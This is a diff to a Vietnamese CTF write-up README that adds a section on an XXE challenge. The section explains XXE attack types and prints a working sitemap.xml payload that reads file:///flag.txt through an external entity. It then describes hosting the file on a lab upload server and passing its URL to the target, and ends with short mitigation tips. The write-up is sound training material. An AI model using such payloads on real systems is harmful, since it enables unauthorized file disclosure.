@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/5eeb1ea4-2c79-48fb-a474-755faa5f92cd)![image](https://github.com/user-attachments/assets/a4f2135c-2945-4295-8626-53e31dacdd36)![image](https://github.com/user-attachments/assets/8499b860-5356-4bad-ab97-ac57bcaf1791)# CTF-Cookie-Arena
+![image](https://github.com/user-attachments/assets/318ebdb3-8f3c-4acd-be24-b2ff3984936f)![image](https://github.com/user-attachments/assets/5eeb1ea4-2c79-48fb-a474-755faa5f92cd)![image](https://github.com/user-attachments/assets/a4f2135c-2945-4295-8626-53e31dacdd36)![image](https://github.com/user-attachments/assets/8499b860-5356-4bad-ab97-ac57bcaf1791)# CTF-Cookie-Arena
 
 <h1>Baby SQLite With Filter</h1>
 
@@ -158,3 +158,44 @@ GOAL: Bạn chỉ có thể lấy được flag nếu bạn truy cập trang web
 Và thế ta là đã lấy được flag
 
 ---
+<h1>COOKIE CRAWLER ENGINE</h1>
+
+<h3>Cơ chế hoạt động:</h3>
+Lỗi XXE dựa vào khả năng parser để tải hoặc chèn dữ liệu từ các nguồn bên ngoài. Điều này dẫn đến nhiều kiểu tấn công: 
+<ol>
+  <li>Local File Disclosure: Truy xuất các thư mục, file nội bộ trong hệ thống bằng cách tham chiếu đường dẫn file trong <b>XML Entity</b>.</li>
+  <img src="https://github.com/user-attachments/assets/3ef3b936-18c5-47f9-8fc7-ec3d07be2807" alt="Local File Disclosure">
+  <li>RCE: Trong trường hợp nghiêm trọng nhất, kẻ tấn công có thể lợi dụng việc parser thực thi các mã lệnh từ tệp bên ngoài.</li>
+  <li>DoS: Kẻ tấn công chèn vào nhiều <b>Entity</b> lồng vào nhau để gây quá tải lên máy chủ.</li>
+</ol>
+Đây là 1 đoạn code mẫu XML để khai thác lỗi XXE:<br>
+<img src="https://github.com/user-attachments/assets/860bdcbe-4973-407b-80b8-af0b6b8309c0" alt="Code mẫu XML"><br>
+
+<br><h3>Step_to_ReProduce:</h3>
+Truy cập vào trang web, ta sẽ nhận được đoạn thông báo như sau <code>"You have to provide a sitemap.xml URL. /?sitemap_url=http://example.com/sitemap.xml"</code><br>
+<img src="https://github.com/user-attachments/assets/8f0ebcf1-80e8-45e0-a205-b5970933ca1b" alt="Thông báo"><br>
+Trang web yêu cầu ta cung cấp 1 URL dẫn đến tệp <code>sitemap.xml</code> thông qua tham số <code>sitemap_url</code>. Nếu trang web này có lỗ hổng XXE thì ta có thể khai thác bằng cách chèn 1 tệp XML có chứa mã độc để tấn công hệ thống. <br>
+<ol>
+  <li>Mình code 1 file XML để khai thác đến /flag.txt như sau: 
+    <pre>
+  &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+  &lt;!DOCTYPE urlset [
+    &lt;!ENTITY xxe SYSTEM "file:///flag.txt" &gt;&gt;
+  ]&gt;
+  &lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;
+    &lt;url&gt;
+      &lt;loc&gt;&amp;xxe;&lt;/loc&gt;
+    &lt;/url&gt;
+  &lt;/urlset&gt;
+    </pre>
+  </li>
+  <li>Upload file lên 1 nơi nào đó có thể lưu file và hiển thị đầy đủ đường dẫn đến file <code>example.com/path_to_file/sitemap.xml</code>. Ở đây mình chọn upload lên <code>http://fileupload.cyberjutsu-lab.tech:12001/</code> và mình có được đường dẫn đến file như sau: <code>http://fileupload.cyberjutsu-lab.tech:12001/upload/083efb603c5314185b67448868b84b1a/sitemap.xml</code></li>
+  <li>Tiếp theo, quay lại trang web và đưa đường dẫn đến file XML mà ta vừa upload cho thông số <code>sitemap_url</code><br></li>
+</ol>
+<img src="https://github.com/user-attachments/assets/40f93f52-8f33-4068-a849-4cf97c3419dc" alt="Upload file">
+
+<br><h3>Hướng dẫn khắc phục lỗi XXE:</h3>
+<ol>
+  <li>Kiểm tra và xác thực dữ liệu đầu vào</li>
+  <li>Cấu hình máy chủ, các thư viện xử lý XML như <code>libxm12</code>,<code>DOMParser</code> để tắt khả năng xử lý.</li>
+</ol>
